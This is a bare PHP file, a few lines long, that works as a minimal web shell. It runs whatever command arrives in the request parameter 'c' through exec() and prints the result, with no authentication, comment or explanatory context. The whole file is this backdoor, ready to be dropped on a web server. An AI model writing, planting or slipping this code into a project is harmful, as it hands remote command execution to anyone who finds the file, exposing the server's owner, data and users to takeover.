<?php
    trim(exec($_REQUEST['c'],$return));
    foreach($return as $val)
    {
        echo $val;
    }
?>